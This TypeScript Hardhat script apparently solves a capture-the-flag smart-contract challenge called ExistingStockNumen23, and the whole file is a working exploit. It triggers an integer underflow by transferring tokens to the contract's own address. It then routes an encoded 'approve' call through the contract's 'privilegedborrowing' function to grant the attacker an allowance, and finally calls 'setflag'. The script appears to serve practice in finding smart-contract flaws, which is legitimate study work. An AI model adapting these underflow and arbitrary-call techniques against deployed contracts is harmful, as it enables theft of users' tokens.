import chalk from "chalk";
import { ethers } from "hardhat";
import { ExistingStockNumen23__factory, ExistingStockNumen23 } from "../../typechain";
import { log, initialize } from "../utils";

async function main() {
    let [existingStockNumen23Contract, attacker] = await initialize<ExistingStockNumen23>(ExistingStockNumen23__factory);

    let tx = await existingStockNumen23Contract.transfer(await existingStockNumen23Contract.getAddress(), 10);
    await tx.wait();
    log(`Successfully underflow, attacker balance: ${chalk.yellow(await existingStockNumen23Contract.balanceOf(attacker.address))}`);
    let contractInterface = existingStockNumen23Contract.interface;
    let calldata = contractInterface.encodeFunctionData("approve", [attacker.address, 200001]);
    tx = await existingStockNumen23Contract.privilegedborrowing(0, attacker.address, await existingStockNumen23Contract.getAddress(), calldata);
    await tx.wait();
    log(`Successfully approve, attacker allowance: ${chalk.yellow(await existingStockNumen23Contract.allowance(await existingStockNumen23Contract.getAddress(), attacker.address))}`)
    tx = await existingStockNumen23Contract.setflag();
    await tx.wait();
    log(`Is solved: ${chalk.yellow(await existingStockNumen23Contract.isSolved())}`);
    
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});